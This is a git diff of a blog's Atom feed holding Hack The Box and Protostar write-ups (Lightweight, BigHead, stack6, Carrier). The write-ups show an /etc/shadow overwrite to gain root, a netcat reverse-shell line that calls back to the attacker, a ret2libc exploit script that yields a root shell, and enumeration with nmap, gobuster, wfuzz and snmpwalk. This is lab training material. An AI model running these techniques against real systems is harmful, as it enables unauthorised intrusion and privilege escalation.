+&lt;h4 id=&quot;and-finally-i-used-openssl-to-replace-the-old-etcshadow-with-the-new-one-and-after-that-we-can-do-su-root-with-the-password-rick&quot;&gt;And finally I used &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; to replace the old &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; with the new one and after that we can do &lt;code class=&quot;highlighter-rouge&quot;&gt;su root&lt;/code&gt; with the password &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt;:&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./openssl enc -in shadow -out /etc/shadow&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/lightweight/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---bighead&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/bighead/&quot;&gt;Hack The Box - BigHead&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is 10.10.10.119, I added it to /etc/hosts as lightweight.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC lightweight.htb 3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first. Ldap Enumeration To enumerate ldap I like to use a tool called ldapsearch, There’s also an nmap script called ldap-search that can do the same thing. ldapsearch : ldapsearch -x -h lightweight.htb -b &quot;dc=lightweight,dc=htb&quot; Full Output : ``` extended LDIF # LDAPv3 base &amp;lt;dc=lightweight,dc=htb&amp;gt; with scope subtree filter: (objectclass=*) requesting: ALL #</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/lightweight/0.png" /></entry><entry><title type="html">Hack The Box - BigHead</title><link href="http://localhost:4000/hack-the-box/bighead/" rel="alternate" type="text/html" title="Hack The Box - BigHead" /><published>2019-05-04T00:00:00+02:00</published><updated>2019-05-04T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/bighead</id><content type="html" xml:base="http://localhost:4000/hack-the-box/bighead/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-bighead-retired-and-heres-my-write-up-about-it-as-you-can-see-its-an-insane-box-actually-its-hard-to-summarize-this-box-as-it-included-a-lot-of-steps-to-achieve-different-goals-most-of-the-steps-require-deep-enumeration-especially-the-initial-foothold-the-part-i-liked-the-most-about-this-box-is-the-win32-buffer-overflow-egghunting-exploitation-as-it-was-very-interesting-the-whole-box-was-challenging-and-the-overall-experience-wasnt-bad-but-i-disliked-the-fact-that-it-had-a-lot-of-trolls-i-found-it-kinda-funny-that-the-box-had-a-lot-of-silicon-valley-references-d-even-the-name-of-the-box-is-the-name-of-one-of-the-characters-anyway-lets-not-waste-more-time-its-a-windows-box-and-its-ip-is-101010112-i-added-it-to-etchosts-as-bigheadhtb-lets-jump-right-in-&quot;&gt;Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of &lt;a href=&quot;https://www.imdb.com/title/tt2575988/&quot;&gt;Silicon Valley&lt;/a&gt; references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.112&lt;/code&gt;. I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;bighead.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
@@ -975,6 +1310,7 @@ system('C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339');
 &lt;p&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---irked&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/irked/&quot;&gt;Hack The Box - Irked&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---lightweight&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lightweight/&quot;&gt;Hack The Box - Lightweight&lt;/a&gt;&lt;/h4&gt;
 &lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of Silicon Valley references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is 10.10.10.112. I added it to /etc/hosts as bighead.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC bighead.htb Only one port is open which is port 80 and it’s running http. Let’s take a look. HTTP Enumeration It’s a website titled PiperNet Comes. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying PIPERNET IS HERE. Also there are two links down there, First one is THIS IS PIPERNET which is the homepage and the other one is PIEDPIPERCOIN. Let’s scroll down and see what else do we have : PIEDPIPERCOIN COMES, and there’s a small description of what piedpipercoin is. After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form : I looked at the contact info and I noticed that the email was info@bachmanity.htb. Let’s check that domain, but before doing that I wanted to check the other page PIEDPIPERCOIN : Instead of PIEDPIPERCOIN COMES it’s saying PIEDPIPERCOIN CAME but nothing is interesting. Let’s check bachmanity.htb, we need to add it to /etc/hosts first : bachmanity.htb It’s only that image and nothing else : Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with test : It sends the request to mailer.bighead.htb, Let’s add it to /etc/hosts and try again : It shows this message then it redirects the browser back to bighead.htb. I also intercepted the request with burp : Tried to manipulate the input, but couldn’t achieve anything. I went to mailer.bighead.htb and got redirected to mailer.bighead.htb/testlink which shows this error : In the background I ran gobuster on bachmanity.htb and bighead.htb with /usr/share/wordlists/dirb/common.txt. bachmanity.htb didn’t have anything : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bachmanity.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:21:01 Starting gobuster ===================================================== /index.html (Status: 200) /index.htm (Status: 200) but bighead.htb gave some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:16:23 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /assets (Status: 301) /backend (Status: 302) /Images (Status: 301) /images (Status: 301) /index.html (Status: 200) I went to /assets and it was forbidden : /backend redirected the browser to bighead.htb/BigHead which gave the same error we saw before : I clicked on error log and it gave the same error : Let’s check if there are any other subdomains. I used wfuzz with subdomains-top1mil-5000.txt from seclists: wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 non-valid subdomain responses are 11232 chars so we will remove those from the output : wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 We got 3 subdomains : dev, mailer and code. We already know about mailer, let’s add dev and code : code.bighead.htb redirected the browser to 127.0.0.1:5080/testlink/login.php So to see what’s on code.bighead.htb we will probably need to forward an internal service to our box. We can’t do that now so we will ignore code.bighead.htb for now. dev.bighead.htb shows this image of bighead : Source has nothing interesting : I ran gobuster again and got some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://dev.bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:55:05 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /blog (Status: 302) /blog_ajax (Status: 302) /blog_inlinemod (Status: 302) /blog_usercp (Status: 302) /blog_search (Status: 302) /blog_report (Status: 302) /blogger (Status: 302) /blogindex (Status: 302) /bloggers (Status: 302) /blogs (Status: 302) /blogspot (Status: 302) /wp-content (Status: 302) But all these pages gave this result : I intercepted the request in burp to figure out why : The response is 302, by following the redirect : It responds with another 302 So it will keep redirecting us in a loop and we won’t get anything. At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with wfuzz instead of gobuster and I got one more result : wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ The reason why gobuster didn’t show us this page is because of the status code. gobuster only showed results with these status codes : [+] Status codes : 200,204,301,302,307,403, While wfuzz showed everything except 404 responses, --hc 404. /coffee gave a response of 418 which is weird. I looked it up and found some info about it here. 418 I'm a teapot ! Anyway let’s take a look : http://dev.bighead.htb/coffee It’s showing this gif : Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?! I intercepted the request with burp and looked at the response : I noticed a weird server name : BigheadWebSvr 1.0. I looked it up and found a repository on the machine creator’s github (3mrgnc3) : I searched through the commits and got this one which seemed to be the right one. It asked for a password : I tried to guess it and after some attempts bighead worked : Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow. Buffer Overflow in BigheadWebSvr I tried to run the server but it complained about some missing dll called libmingwex-0.dll : So I installed mingw and copied the dll to the same directory as the server : Then I had to allow access for it : Now the server is running : But not on port 80 : I did netstat -a -b and found that it’s running on port 8008 : Great, I intercepted the request with burp then I ran the server again with Immunity Debugger : Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example R1ck that egg is doubled and added before the shellcode like this : R1ckR1ck + shellcode. It’s explained very well in skape’s paper Safely Searching Process Virtual Address Space. There are also many practical tutorials just search for win32 egghunting. Now back to the vulnerable server, first thing we need to know is the offset. I’m using mona plugin. Documentation !mona config -set workingfolder c:\logs\%p, to make mona output to C:\logs To find the offset we will create a pattern !mona pc 100 (creates a pattern of 100 chars), this is the same as pattern_create.rb from metasploit. I used it in my buffer overflow write-ups. It will put the output in a file called pattern.txt in C:\logs : Pattern : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Full output : ``` ================================================================================ Output generated by mona.py v2.0, rev 585 - Immunity Debugger Corelan Team - https://www.corelan.be ================================================================================ Process being debugged : BigheadWebSvr (pid 1300) Current mona arguments: pc 100 ================================================================================ 2019-04-24 22:43:44 ================================================================================</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/bighead/0.png" /></entry><entry><title type="html">Hack The Box - Irked</title><link href="http://localhost:4000/hack-the-box/irked/" rel="alternate" type="text/html" title="Hack The Box - Irked" /><published>2019-04-27T00:00:00+02:00</published><updated>2019-04-27T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/irked</id><content type="html" xml:base="http://localhost:4000/hack-the-box/irked/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
@@ -2386,187 +2722,4 @@ print buffer + system + exit + shell
 &lt;p&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-buffer-overflow-article--buffer-overflow-practical-examples--shellcode-injection-and-local-privilege-escalation---protostar-stack5&quot;&gt;Previous Buffer Overflow article : &lt;a href=&quot;/binary-exploitation/bof5/&quot;&gt;Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in ! Read the previous posts if you haven’t yet. ./stack6 As always we are given the source code of the binary : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; void getpath() { char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp;amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } printf(&quot;got path %s\n&quot;, buffer); } int main(int argc, char **argv) { getpath(); } What this code is doing is just printing input path please: then it stores our input in a buffer of 64 chars and finally it prints it out: Our problem is this if statement : if((ret &amp;amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the previous example. We can defeat this by a technique called ret2libc. ret2libc So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function system() and make it execute /bin/sh. (Read about system() here). We will also need to use the function exit() to make the program exit cleanly. (Read about exit() here). So finally our attack payload will be : “padding –&amp;gt; address of system() –&amp;gt; address of exit() –&amp;gt; /bin/sh” instead of : “padding –&amp;gt; new return address –&amp;gt; NOP –&amp;gt; shellcode”. Now let’s see how will we do it. Exploiation Again , this will execute /bin/sh as root because this binary is an suid binary. If it wasn’t suid we would get a shell as the same user. We can check by using find : find /opt/protostar/bin/ -perm -4000 | grep stack6 As you can see stack6 is an suid binary. So first of all , after we call system() we will need to give it /bin/sh , how will we do that ? A nice way to do it is to store /bin/sh in an environment variable. I created a variable and called it SHELL : Now we need to find the address of that variable , we can do it from gdb by setting a breakpoint at main , then running the program and doing this : x/s *((char **)environ+x) where x is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of SHELL But I found a better way to do it when I was reading an article on shellblade. We will use a c program to tell us the estimated address. Code : #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; int main(int argc, char **argv) { char *ptr = getenv(&quot;SHELL&quot;); if (ptr != NULL) { printf(&quot;Estimated address: %p\n&quot;, ptr); return 0; } } Then we will compile it : gcc address.c -o address : As you can see it’s telling us the address of the environment variable SHELL. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address. Let’s start by finding the offset. As we did before we will use pattern_create.rb and pattern_offset.rb from metasploit exploitation tools. ./pattern_create.rb -l 100 We have our pattern now let’s run the program in gdb and set a breakpoint before main break *main. Then we will type c to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen : We got the address 0x37634136 , now let’s go back and use pattern_offset.rb : ./pattern_offset.rb -q 0x37634136 So after 80 chars the buffer overflows. Next thing to check is the addresses of system() and exit(). From gdb we will set a break point at main and type r to run the program. After it reaches the break point and breaks we can get the address of system by typing p system and we will do the same thing for exit p exit : Address of system : 0xb7ecffb0 Address of exit : 0xb7ec60c0 Lastly we will check the address of SHELL again because it’s subject to change : Address : 0xbffff985 Let’s check our notes : Ok , we are ready to write our exploit , we will use struct import struct like we did before. We will create a variable for the chars we will use to fill the buffer and call it buffer , its value will be 80 A’s. buffer = &quot;A&quot; * 80 Then we will create 3 variables to hold the addresses of system() , exit() and SHELL. We will use struct to reverse the addresses. system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) And finally we will print the payload. print buffer + system + exit + shell Final script : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) print buffer + system + exit + shell We have to remember that the address of SHELL is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. python /tmp/stack6.py &amp;gt; /tmp/payload , Then we will cat the file and pipe the output to ./stack6 : And no shell , After going up and down by editing the address in the python script I finally got the right address which is 0xbffff992 : python /tmp/stack6.py &amp;gt; /tmp/payload cat /tmp/payload - | ./stack6 root shell! So after editing the address of shell variable , the script will be like this : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff992) print buffer + system + exit + shell That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/binary-exploitation/BOF6/0.png" /></entry><entry><title type="html">Hack The Box - Carrier</title><link href="http://localhost:4000/hack-the-box/carrier/" rel="alternate" type="text/html" title="Hack The Box - Carrier" /><published>2019-03-16T00:00:00+02:00</published><updated>2019-03-16T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/carrier</id><content type="html" xml:base="http://localhost:4000/hack-the-box/carrier/">&lt;hr /&gt;
-
-&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
-&lt;h4 id=&quot;hey-guys-today-carrier-retired-and-here-is-my-write-up-about-it-user-on-this-box-wasnt-hard-to-get--but-for-root-its-a-different-thing-because-we-will-go-through-some-networking-tricks-and-we-will-perform-an-attack-called-bgp-hijacking-the-overall-experience-was-great-and-carrier-was-one-of-the-best-boxes-on-this-platfrom-its-a-linux-box-and-its-ip-is-101010105-i-added-it-to-etchosts-as-carrierhtb-lets-jump-right-in-&quot;&gt;Hey guys today Carrier retired and here is my write-up about it. User on this box wasn’t hard to get , but for root it’s a different thing because we will go through some networking tricks and we will perform an attack called bgp hijacking. The overall experience was great and carrier was one of the best boxes on this platfrom. It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.105&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;carrier.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;h4 id=&quot;as-always-we-will-start-by-using-nmap-to-scan-for-open-ports-and-services&quot;&gt;As always we will start by using nmap to scan for open ports and services.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC carrier.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/carrier/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-get-ftp-on-port-21--ssh-on-port-22-and-http-on-port-80-some-other-boxes-had-anonymous-ftp-access-allowed-but-here-its-not-allowed--also-the-port-is-filtered-so-we-are-not-going-to-check-ftp&quot;&gt;We get ftp on port 21 , ssh on port 22 and http on port 80. Some other boxes had anonymous ftp access allowed but here it’s not allowed , also the port is filtered so we are not going to check ftp.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;on-http-theres-a-web-application-called-lyghtspeed-and-we-are-asked-to-login-under-please-login-we-see-that-its-saying-error-45007-and-error-45009-which-is-interesting&quot;&gt;On http there’s a web application called &lt;code class=&quot;highlighter-rouge&quot;&gt;Lyghtspeed&lt;/code&gt; and we are asked to login. Under “Please login” we see that it’s saying &lt;code class=&quot;highlighter-rouge&quot;&gt;Error 45007&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Error 45009&lt;/code&gt; which is interesting.&lt;/h4&gt;
-&lt;h4 id=&quot;next-thing-to-check-is-sub-directories-enumeration-&quot;&gt;Next thing to check is sub directories enumeration :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster -u http://carrier.htb/ -w /usr/share/wordlists/dirb/common.txt -t 100 -to 200s
-
-=====================================================
-Gobuster v2.0.0              OJ Reeves (@TheColonial)
-=====================================================
-[+] Mode         : dir
-[+] Url/Domain   : http://carrier.htb/
-[+] Threads      : 100
-[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
-[+] Status codes : 200,204,301,302,307,403
-[+] Timeout      : 3m20s
-=====================================================
-2019/03/15 11:50:56 Starting gobuster
-=====================================================
-/.hta (Status: 403)
-/.htaccess (Status: 403)
-/.htpasswd (Status: 403)
-/css (Status: 301)
-/debug (Status: 301)
-/doc (Status: 301)
-/fonts (Status: 301)
-/img (Status: 301)
-/index.php (Status: 200)
-/js (Status: 301)
-/server-status (Status: 403)
-/tools (Status: 301)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;we-will-only-check-interesting-ones-&quot;&gt;We will only check interesting ones :&lt;/h4&gt;
-&lt;h4 id=&quot;tools-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/tools&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-has-a-php-file-called-remotephp-and-by-checking-it-&quot;&gt;It has a php file called &lt;code class=&quot;highlighter-rouge&quot;&gt;remote.php&lt;/code&gt; and by checking it :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-says-license-expired-exiting&quot;&gt;It says “License expired, exiting…”&lt;/h4&gt;
-&lt;h4 id=&quot;debug-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/debug&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;its-just-phpinfo-page&quot;&gt;It’s just &lt;code class=&quot;highlighter-rouge&quot;&gt;phpinfo&lt;/code&gt; page&lt;/h4&gt;
-&lt;h4 id=&quot;doc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/doc&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;theres-a-pdf-file-and-an-image--the-pdf-file-is-called-error_codespdf-so-it-might-be-helpful-because-we-saw-earlier-two-errors-on-the-login-page&quot;&gt;There’s a pdf file and an image , the pdf file is called &lt;code class=&quot;highlighter-rouge&quot;&gt;error_codes.pdf&lt;/code&gt; so it might be helpful because we saw earlier two errors on the login page.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/7.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/carrier/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;error-45007-is-license-invalid-or-expired&quot;&gt;Error &lt;code class=&quot;highlighter-rouge&quot;&gt;45007&lt;/code&gt; is “License invalid or expired”&lt;/h4&gt;
-&lt;h4 id=&quot;error-45009-is-system-credentials-have-not-been-set-default-admin-user-password-is-set-see-chassis-serial-number&quot;&gt;Error &lt;code class=&quot;highlighter-rouge&quot;&gt;45009&lt;/code&gt; is “System credentials have not been set. Default admin user password is set (see chassis serial number)”&lt;/h4&gt;
-&lt;h4 id=&quot;so-now-we-know-that-we-need-that-serial-number-to-be-able-to-login--but-how-to-get-it-&quot;&gt;So now we know that we need that serial number to be able to login , but how to get it ?&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;more-nmap&quot;&gt;More nmap&lt;/h3&gt;
-&lt;h4 id=&quot;at-this-point-we-may-think-that-there-are-other-services-running-on-the-box-and-we-have-missed-them-so-before-running-a-full-tcp-scan-we-will-scan-udp-first&quot;&gt;At this point we may think that there are other services running on the box and we have missed them. So before running a full tcp scan we will scan udp first.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sU carrier.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/carrier/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-get-dhcps-on-port-67-and-snmp-on-port-161-lets-check-snmp&quot;&gt;We get dhcps on port 67 and snmp on port 161. Let’s check snmp.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;snmp-enumeration&quot;&gt;Snmp Enumeration&lt;/h3&gt;
-&lt;h4 id=&quot;snmp-stands-for-simple-network-management-protocols-and-its-an-internet-standard-protocol-for-collecting-and-organizing-information-about-managed-devices-on-ip-networks-and-for-modifying-that-information-to-change-device-behavior-you-can-read-more-about-it-here&quot;&gt;Snmp stands for Simple Network Management Protocols and it’s an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. you can read more about it &lt;a href=&quot;https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;we-will-use-a-tool-called-snmpwalk--its-an-important-tool-in-snmp-enumeration-and-can-tell-us-a-lot-of-useful-information-read-about-snmpwalk-here&quot;&gt;We will use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk&lt;/code&gt; , it’s an important tool in snmp enumeration and can tell us a lot of useful information. Read about snmpwalk &lt;a href=&quot;http://net-snmp.sourceforge.net/docs/man/snmpwalk.html&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk -c public -v 1 carrier.htb&lt;/code&gt;&lt;/p&gt;
